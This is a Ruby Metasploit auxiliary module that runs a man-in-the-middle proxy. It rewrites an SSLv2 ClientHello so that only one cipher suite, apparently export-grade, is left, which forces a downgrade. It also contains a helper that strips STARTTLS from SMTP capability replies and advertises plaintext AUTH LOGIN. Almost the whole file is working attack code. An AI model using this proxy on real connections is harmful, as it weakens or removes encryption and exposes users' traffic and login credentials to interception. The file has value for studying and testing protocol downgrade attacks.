require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	
	# mixin Tcp
	include Msf::Exploit::Remote::Tcp
	# create alias methods
	alias_method :cleanup_tcp, :cleanup
	alias_method :run_tcp, :run
	# mixin TcpServer
	include Msf::Exploit::Remote::TcpServer
	# create alias methods
	alias_method :cleanup_tcpserver, :cleanup
	alias_method :run_tcpserver, :run
	alias_method :exploit_tcpserver, :exploit


	def initialize(info = {})
		super(update_info(info,
			'Name' => 'Strip Ciphersuites from SSL2',
			'Description' => %q{ well well well },
			'Author' => '@f0rki',
			'License' => BSD_LICENSE,
			)
			)

		# in my case I didn't need this SSL stuff
		deregister_options('SSL', 'SSLCert', 'SSLVersion')
	
		register_options(
			[
				OptString.new('SRVHOST', [ true, "local listen address", "0.0.0.0" ]),
				OptPort.new('SRVPORT', [ true, "local service port", 4443 ]),
				OptString.new('RHOST', [ true, "the actual server", "localhost" ]),
				OptPort.new('RPORT', [ true, "remote service port", 4433 ]),
			], self.class)
                datastore['done'] = false
	end


	# run tcp server, i.e. start listening port
	def run
		exploit_tcpserver
	end
	alias_method :exploit, :run
	
	# cleanup method, which calls both Tcp and TcpServer cleanup
	def cleanup
		cleanup_tcp()
		cleanup_tcpserver()
	end
	
	# client connected, so we let the Tcp mixin connect
	def on_client_connect(client)
		print_status("client connected " + client.peerinfo())
		connect()
	end

	# client disconnected, so we let the Tcp mixin disconnect
	def on_client_close(client)
		print_status("client disconnected " + client.peerinfo())
		disconnect() # disconnect to actual server
	end

	def perror_exit(errmsg)
		print_status(errmsg)
		disconnect() # diconnect from the actual server
		stop_service() # stop our service
	end



	def on_client_data(client)
		begin
			# receive from client
			data = client.get_once()
			return if data.nil? or data.length == 0
			
			# print traffic
			print_status("received the following from client")
			print_status(Rex::Text::to_hex_dump(data))


			### do something evil with the tcp data here
                        if datastore['done'] == false
                            ssl_len = data[1].unpack("C")[0]
                            hmtype = data[2].unpack("C")[0]
                            version = data[3,2].unpack("n")[0]
                            if version != 2
                                perror_exit("SSL Version " + version.to_s + " detected.")
                            end
			    cipherspeclen = data[5,2].unpack("n")[0]
                            sessidlen = data[7,2].unpack("n")[0]
                            challengelen = data[9,2].unpack("n")[0]
                            challenge = data[11 + cipherspeclen, challengelen]
                            if challenge.length != challengelen
                                perror_exit("unexpected challenge length")
                            end

                            new_len = ssl_len - cipherspeclen + 3
                            newclienthello = [0x80, new_len, hmtype, version, 3, sessidlen, challengelen, 0x06, 0x00, 0x40].pack("CCCnnnnCCC") << challenge

                            data = newclienthello
                            datastore['done'] = true
                        end

			
			# send data to server
			sock.send(data, 0)
			# receive data from server
			respdata = sock.get_once()
			return if respdata.nil? or respdata.length == 0
			
			# print traffic
			print_status("received the following from server")
			print_status(Rex::Text::to_hex_dump(respdata))
			
			### do something evil with the tcp data here


			# send data back to client			
			client.put(respdata)
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::Exception
			print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
	end

	def strip_capabilities(data)
		data.sub!("250-STARTTLS\r\n", "250-XPWN\r\n")
		data << "250-AUTH\r\n250-AUTH=LOGIN\r\n"
		return data
	end

end
